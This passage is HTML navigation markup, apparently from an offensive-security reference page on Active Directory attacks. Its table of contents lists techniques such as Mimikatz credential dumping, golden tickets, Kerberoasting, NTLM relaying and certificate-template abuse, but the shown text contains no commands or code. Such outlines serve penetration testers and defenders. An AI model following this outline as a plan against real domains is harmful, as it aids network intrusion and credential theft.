        <label class="md-nav__link" for="__nav_21" id="__nav_21_label" tabindex="0">
          Insecure Management Interface
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_21_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_21">
          <span class="md-nav__icon md-icon"></span>
          Insecure Management Interface
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Management%20Interface/" class="md-nav__link">
        Insecure Management Interface
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_22" >
      
      
      
        <label class="md-nav__link" for="__nav_22" id="__nav_22_label" tabindex="0">
          Insecure Randomness
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_22_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_22">
          <span class="md-nav__icon md-icon"></span>
          Insecure Randomness
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Randomness/" class="md-nav__link">
        Insecure Randomness
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_23" >
      
      
      
        <label class="md-nav__link" for="__nav_23" id="__nav_23_label" tabindex="0">
          Insecure Source Code Management
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_23_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_23">
          <span class="md-nav__icon md-icon"></span>
          Insecure Source Code Management
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Insecure%20Source%20Code%20Management/" class="md-nav__link">
        Insecure Source Code Management
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_24" >
      
      
      
        <label class="md-nav__link" for="__nav_24" id="__nav_24_label" tabindex="0">
          JSON Web Token
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_24_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_24">
          <span class="md-nav__icon md-icon"></span>
          JSON Web Token
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../JSON%20Web%20Token/" class="md-nav__link">
        JWT - JSON Web Token
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_25" >
      
      
      
        <label class="md-nav__link" for="__nav_25" id="__nav_25_label" tabindex="0">
          Java RMI
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_25_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_25">
          <span class="md-nav__icon md-icon"></span>
          Java RMI
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Java%20RMI/" class="md-nav__link">
        Java RMI
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_26" >
      
      
      
        <label class="md-nav__link" for="__nav_26" id="__nav_26_label" tabindex="0">
          Kubernetes
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_26_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_26">
          <span class="md-nav__icon md-icon"></span>
          Kubernetes
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Kubernetes/" class="md-nav__link">
        Kubernetes
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_27" >
      
      
      
        <label class="md-nav__link" for="__nav_27" id="__nav_27_label" tabindex="0">
          LDAP Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_27_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_27">
          <span class="md-nav__icon md-icon"></span>
          LDAP Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../LDAP%20Injection/" class="md-nav__link">
        LDAP Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_28" >
      
      
      
        <label class="md-nav__link" for="__nav_28" id="__nav_28_label" tabindex="0">
          LaTeX Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_28_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_28">
          <span class="md-nav__icon md-icon"></span>
          LaTeX Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../LaTeX%20Injection/" class="md-nav__link">
        LaTex Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
    
  
  
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_29" checked>
      
      
      
        <label class="md-nav__link" for="__nav_29" id="__nav_29_label" tabindex="0">
          Methodology and Resources
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_29_label" aria-expanded="true">
        <label class="md-nav__title" for="__nav_29">
          <span class="md-nav__icon md-icon"></span>
          Methodology and Resources
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          Active Directory Attacks
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        Active Directory Attacks
      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#summary" class="md-nav__link">
    Summary
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#tools" class="md-nav__link">
    Tools
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#kerberos-clock-synchronization" class="md-nav__link">
    Kerberos Clock Synchronization
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#active-directory-recon" class="md-nav__link">
    Active Directory Recon
  </a>
  
    <nav class="md-nav" aria-label="Active Directory Recon">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#using-bloodhound" class="md-nav__link">
    Using BloodHound
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-powerview" class="md-nav__link">
    Using PowerView
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-ad-module" class="md-nav__link">
    Using AD Module
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#other-interesting-commands" class="md-nav__link">
    Other Interesting Commands
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#from-cve-to-system-shell-on-dc" class="md-nav__link">
    From CVE to SYSTEM shell on DC
  </a>
  
    <nav class="md-nav" aria-label="From CVE to SYSTEM shell on DC">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ms14-068-checksum-validation" class="md-nav__link">
    MS14-068 Checksum Validation
  </a>
  
    <nav class="md-nav" aria-label="MS14-068 Checksum Validation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#mitigations" class="md-nav__link">
    Mitigations
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#zerologon" class="md-nav__link">
    ZeroLogon
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#printnightmare" class="md-nav__link">
    PrintNightmare
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#samaccountname-spoofing" class="md-nav__link">
    samAccountName spoofing
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#open-shares" class="md-nav__link">
    Open Shares
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#scf-and-url-file-attack-against-writeable-share" class="md-nav__link">
    SCF and URL file attack against writeable share
  </a>
  
    <nav class="md-nav" aria-label="SCF and URL file attack against writeable share">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#scf-files" class="md-nav__link">
    SCF Files
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#url-files" class="md-nav__link">
    URL Files
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-library-files" class="md-nav__link">
    Windows Library Files
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-search-connectors-files" class="md-nav__link">
    Windows Search Connectors Files
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#passwords-in-sysvol-group-policy-preferences" class="md-nav__link">
    Passwords in SYSVOL &amp; Group Policy Preferences
  </a>
  
    <nav class="md-nav" aria-label="Passwords in SYSVOL &amp; Group Policy Preferences">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#automate-the-sysvol-and-passwords-research" class="md-nav__link">
    Automate the SYSVOL and passwords research
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mitigations_1" class="md-nav__link">
    Mitigations
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#exploit-group-policy-objects-gpo" class="md-nav__link">
    Exploit Group Policy Objects GPO
  </a>
  
    <nav class="md-nav" aria-label="Exploit Group Policy Objects GPO">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#find-vulnerable-gpo" class="md-nav__link">
    Find vulnerable GPO
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#abuse-gpo-with-sharpgpoabuse" class="md-nav__link">
    Abuse GPO with SharpGPOAbuse
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#abuse-gpo-with-powergpoabuse" class="md-nav__link">
    Abuse GPO with PowerGPOAbuse
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#abuse-gpo-with-pygpoabuse" class="md-nav__link">
    Abuse GPO with pyGPOAbuse
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#abuse-gpo-with-powerview" class="md-nav__link">
    Abuse GPO with PowerView
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#abuse-gpo-with-standin" class="md-nav__link">
    Abuse GPO with StandIn
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#dumping-ad-domain-credentials" class="md-nav__link">
    Dumping AD Domain Credentials
  </a>
  
    <nav class="md-nav" aria-label="Dumping AD Domain Credentials">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#using-ndtsutil" class="md-nav__link">
    Using ndtsutil
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-vshadow" class="md-nav__link">
    Using Vshadow
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-vssadmin" class="md-nav__link">
    Using vssadmin
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-diskshadow-a-windows-signed-binary" class="md-nav__link">
    Using DiskShadow (a Windows signed binary)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-esentutlexe" class="md-nav__link">
    Using esentutl.exe
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#extract-hashes-from-ntdsdit" class="md-nav__link">
    Extract hashes from ntds.dit
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#alternatives-modules" class="md-nav__link">
    Alternatives - modules
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-mimikatz-dcsync" class="md-nav__link">
    Using Mimikatz DCSync
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-mimikatz-sekurlsa" class="md-nav__link">
    Using Mimikatz sekurlsa
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#crack-ntlm-hashes-with-hashcat" class="md-nav__link">
    Crack NTLM hashes with hashcat
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ntds-reversible-encryption" class="md-nav__link">
    NTDS Reversible Encryption
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#user-hunting" class="md-nav__link">
    User Hunting
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#password-spraying" class="md-nav__link">
    Password spraying
  </a>
  
    <nav class="md-nav" aria-label="Password spraying">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#kerberos-pre-auth-bruteforcing" class="md-nav__link">
    Kerberos pre-auth bruteforcing
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#spray-a-pre-generated-passwords-list" class="md-nav__link">
    Spray a pre-generated passwords list
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#spray-passwords-against-the-rdp-service" class="md-nav__link">
    Spray passwords against the RDP service
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#badpwdcount-attribute" class="md-nav__link">
    BadPwdCount attribute
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#password-in-ad-user-comment" class="md-nav__link">
    Password in AD User comment
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#password-of-pre-created-computer-account" class="md-nav__link">
    Password of Pre-Created Computer Account
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reading-laps-password" class="md-nav__link">
    Reading LAPS Password
  </a>
  
    <nav class="md-nav" aria-label="Reading LAPS Password">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#determine-if-laps-is-installed" class="md-nav__link">
    Determine if LAPS is installed
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#extract-laps-password" class="md-nav__link">
    Extract LAPS password
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#grant-laps-access" class="md-nav__link">
    Grant LAPS Access
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reading-gmsa-password" class="md-nav__link">
    Reading GMSA Password
  </a>
  
    <nav class="md-nav" aria-label="Reading GMSA Password">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#gmsa-attributes-in-the-active-directory" class="md-nav__link">
    GMSA Attributes in the Active Directory
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#extract-nt-hash-from-the-active-directory" class="md-nav__link">
    Extract NT hash from the Active Directory
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#forging-golden-gmsa" class="md-nav__link">
    Forging Golden GMSA
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#kerberos-tickets" class="md-nav__link">
    Kerberos Tickets
  </a>
  
    <nav class="md-nav" aria-label="Kerberos Tickets">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#dump-kerberos-tickets" class="md-nav__link">
    Dump Kerberos Tickets
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#replay-kerberos-tickets" class="md-nav__link">
    Replay Kerberos Tickets
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#convert-kerberos-tickets" class="md-nav__link">
    Convert Kerberos Tickets
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#pass-the-ticket-golden-tickets" class="md-nav__link">
    Pass-the-Ticket Golden Tickets
  </a>
  
    <nav class="md-nav" aria-label="Pass-the-Ticket Golden Tickets">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#using-mimikatz" class="md-nav__link">
    Using Mimikatz
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-meterpreter" class="md-nav__link">
    Using Meterpreter
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-a-ticket-on-linux" class="md-nav__link">
    Using a ticket on Linux
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#pass-the-ticket-silver-tickets" class="md-nav__link">
    Pass-the-Ticket Silver Tickets
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#pass-the-ticket-diamond-tickets" class="md-nav__link">
    Pass-the-Ticket Diamond Tickets
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#pass-the-ticket-sapphire-tickets" class="md-nav__link">
    Pass-the-Ticket Sapphire Tickets
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#kerberoasting" class="md-nav__link">
    Kerberoasting
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#krb_as_rep-roasting" class="md-nav__link">
    KRB_AS_REP Roasting
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pass-the-hash" class="md-nav__link">
    Pass-the-Hash
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#overpass-the-hash-pass-the-key" class="md-nav__link">
    OverPass-the-Hash (pass the key)
  </a>
  
    <nav class="md-nav" aria-label="OverPass-the-Hash (pass the key)">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#using-impacket" class="md-nav__link">
    Using impacket
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-rubeus" class="md-nav__link">
    Using Rubeus
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#capturing-and-cracking-net-ntlmv1ntlmv1-hashes" class="md-nav__link">
    Capturing and cracking Net-NTLMv1/NTLMv1 hashes
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#capturing-and-cracking-net-ntlmv2ntlmv2-hashes" class="md-nav__link">
    Capturing and cracking Net-NTLMv2/NTLMv2 hashes
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#man-in-the-middle-attacks-relaying" class="md-nav__link">
    Man-in-the-Middle attacks &amp; relaying
  </a>
  
    <nav class="md-nav" aria-label="Man-in-the-Middle attacks &amp; relaying">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ms08-068-ntlm-reflection" class="md-nav__link">
    MS08-068 NTLM reflection
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-signing-disabled-and-ipv4" class="md-nav__link">
    SMB Signing Disabled and IPv4
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-signing-disabled-and-ipv6" class="md-nav__link">
    SMB Signing Disabled and IPv6
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#drop-the-mic" class="md-nav__link">
    Drop the MIC
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ghost-potato-cve-2019-1384" class="md-nav__link">
    Ghost Potato - CVE-2019-1384
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#remotepotato0-dcom-dce-rpc-relay" class="md-nav__link">
    RemotePotato0 DCOM DCE RPC relay
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dns-poisonning-relay-delegation-with-mitm6" class="md-nav__link">
    DNS Poisonning - Relay delegation with mitm6
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#relaying-with-webdav-trick" class="md-nav__link">
    Relaying with WebDav Trick
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#man-in-the-middle-rdp-connections-with-pyrdp-mitm" class="md-nav__link">
    Man-in-the-middle RDP connections with pyrdp-mitm
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#active-directory-certificate-services" class="md-nav__link">
    Active Directory Certificate Services
  </a>
  
    <nav class="md-nav" aria-label="Active Directory Certificate Services">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#esc1-misconfigured-certificate-templates" class="md-nav__link">
    ESC1 - Misconfigured Certificate Templates
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#esc2-misconfigured-certificate-templates" class="md-nav__link">
    ESC2 - Misconfigured Certificate Templates
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#esc3-misconfigured-enrollment-agent-templates" class="md-nav__link">
    ESC3 - Misconfigured Enrollment Agent Templates
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#esc4-access-control-vulnerabilities" class="md-nav__link">
    ESC4 - Access Control Vulnerabilities
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#esc6-editf_attributesubjectaltname2" class="md-nav__link">
    ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#esc7-vulnerable-certificate-authority-access-control" class="md-nav__link">
    ESC7 - Vulnerable Certificate Authority Access Control
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#esc8-ad-cs-relay-attack" class="md-nav__link">
    ESC8 - AD CS Relay Attack
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#esc9-no-security-extension" class="md-nav__link">
    ESC9 - No Security Extension
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#esc11-relaying-ntlm-to-icpr" class="md-nav__link">
    ESC11 - Relaying NTLM to ICPR
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#certifried-cve-2022-26923" class="md-nav__link">
    Certifried CVE-2022-26923
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#pass-the-certificate" class="md-nav__link">
    Pass-The-Certificate
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#active-directory-federation-services" class="md-nav__link">
    Active Directory Federation Services
  </a>
  
    <nav class="md-nav" aria-label="Active Directory Federation Services">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#adfs-golden-saml" class="md-nav__link">
    ADFS - Golden SAML
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#unpac-the-hash" class="md-nav__link">
    UnPAC The Hash
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#shadow-credentials" class="md-nav__link">
    Shadow Credentials
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#active-directory-groups" class="md-nav__link">
    Active Directory Groups
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#dangerous-built-in-groups-usage" class="md-nav__link">
    Dangerous Built-in Groups Usage
  </a>
  
    <nav class="md-nav" aria-label="Dangerous Built-in Groups Usage">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#adminsdholder-abuse" class="md-nav__link">
    AdminSDHolder Abuse
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#abusing-dns-admins-group" class="md-nav__link">
    Abusing DNS Admins Group
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#abusing-schema-admins-group" class="md-nav__link">
    Abusing Schema Admins Group
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#abusing-backup-operators-group" class="md-nav__link">
    Abusing Backup Operators Group
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#abusing-active-directory-aclsaces" class="md-nav__link">
    Abusing Active Directory ACLs/ACEs
  </a>
  
    <nav class="md-nav" aria-label="Abusing Active Directory ACLs/ACEs">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#genericall" class="md-nav__link">
    GenericAll
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#genericwrite" class="md-nav__link">
    GenericWrite
  </a>
  
    <nav class="md-nav" aria-label="GenericWrite">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#genericwrite-and-remote-connection-manager" class="md-nav__link">
    GenericWrite and Remote Connection Manager
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#writedacl" class="md-nav__link">
    WriteDACL
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#writeowner" class="md-nav__link">
    WriteOwner
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#readlapspassword" class="md-nav__link">
    ReadLAPSPassword
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#readgmsapassword" class="md-nav__link">
    ReadGMSAPassword
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#forcechangepassword" class="md-nav__link">
    ForceChangePassword
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#dcom-exploitation" class="md-nav__link">
    DCOM Exploitation
  </a>
  
    <nav class="md-nav" aria-label="DCOM Exploitation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#dcom-via-mmc-application-class" class="md-nav__link">
    DCOM via MMC Application Class
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dcom-via-office" class="md-nav__link">
    DCOM via Office
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dcom-via-shellexecute" class="md-nav__link">
    DCOM via ShellExecute
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dcom-via-shellbrowserwindow" class="md-nav__link">
    DCOM via ShellBrowserWindow
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#trust-relationship-between-domains" class="md-nav__link">
    Trust relationship between domains
  </a>
  
    <nav class="md-nav" aria-label="Trust relationship between domains">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enumerate-trusts-between-domains" class="md-nav__link">
    Enumerate trusts between domains
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exploit-trusts-between-domains" class="md-nav__link">
    Exploit trusts between domains
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#child-domain-to-forest-compromise-sid-hijacking" class="md-nav__link">
    Child Domain to Forest Compromise - SID Hijacking
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#forest-to-forest-compromise-trust-ticket" class="md-nav__link">
    Forest to Forest Compromise - Trust Ticket
  </a>
  
    <nav class="md-nav" aria-label="Forest to Forest Compromise - Trust Ticket">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#dumping-trust-passwords-trust-keys" class="md-nav__link">
    Dumping trust passwords (trust keys)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#create-a-forged-trust-ticket-inter-realm-tgt-using-mimikatz" class="md-nav__link">
    Create a forged trust ticket (inter-realm TGT) using Mimikatz
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#use-the-trust-ticket-file-to-get-a-st-for-the-targeted-service" class="md-nav__link">
    Use the Trust Ticket file to get a ST for the targeted service
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#privileged-access-management-pam-trust" class="md-nav__link">
    Privileged Access Management (PAM) Trust
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#kerberos-unconstrained-delegation" class="md-nav__link">
    Kerberos Unconstrained Delegation
  </a>
  
    <nav class="md-nav" aria-label="Kerberos Unconstrained Delegation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#spoolservice-abuse-with-unconstrained-delegation" class="md-nav__link">
    SpoolService Abuse with Unconstrained Delegation
  </a>
  
    <nav class="md-nav" aria-label="SpoolService Abuse with Unconstrained Delegation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#find-delegation" class="md-nav__link">
    Find delegation
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#spoolservice-status" class="md-nav__link">
    SpoolService status
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#monitor-with-rubeus" class="md-nav__link">
    Monitor with Rubeus
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#force-a-connect-back-from-the-dc" class="md-nav__link">
    Force a connect back from the DC
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#load-the-ticket" class="md-nav__link">
    Load the ticket
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mitigation" class="md-nav__link">
    Mitigation
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ms-efsrpc-abuse-with-unconstrained-delegation" class="md-nav__link">
    MS-EFSRPC Abuse with Unconstrained Delegation
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#kerberos-constrained-delegation" class="md-nav__link">
    Kerberos Constrained Delegation
  </a>
  
    <nav class="md-nav" aria-label="Kerberos Constrained Delegation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
